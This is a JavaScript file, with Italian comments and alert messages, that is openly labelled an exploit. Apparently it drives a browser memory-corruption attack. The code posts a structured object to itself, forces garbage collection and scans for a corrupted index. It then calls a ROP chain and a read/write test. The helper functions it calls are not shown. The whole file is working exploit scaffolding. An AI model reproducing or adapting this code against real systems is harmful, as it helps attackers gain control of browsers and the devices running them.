export async function main() {
    alert("Exploit iniziato");

    const num_elems = 5;
    let root = createObjectStructure(num_elems);
    let msg = root;
    let data2 = null;
    let idx = null;

    alert("Oggetto struttura creata");

    let found = false;
    let attempts = 0; // Contatore per evitare loop infinito

    while (!found && attempts < 3) {
        let data = null;

        try {
            const prom = new Promise((resolve, reject) => {
                const timer = setTimeout(() => reject("Timeout"), 5000);
                addEventListener('message', event => {
                    clearTimeout(timer);
                    resolve(event.data);
                }, { once: true });
            });

            alert("Postando messaggio...");
            postMessage(msg, origin);

            data = await prom;
            alert("Messaggio ricevuto con successo: " + JSON.stringify(data));

            gc();  // Garbage collection
            alert("GC dopo messaggio.");

            await sleep(100);

            alert("Inizio ricerca dell'indice...");
            for (let i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Errore durante l'elaborazione: " + e);
        }

        attempts++;
    }

    if (!found) {
        alert("Non Ã¨ stato possibile trovare l'indice dopo 3 tentativi.");
        return;
    }

    alert('Exploit attivato, prova a fare crash');
    alert('[+] idx: ' + idx);

    let rop = ropChain();
    rwTest(0xdeadbeef, 0x1337);
    alert("ROP chain e test RW completati");
}
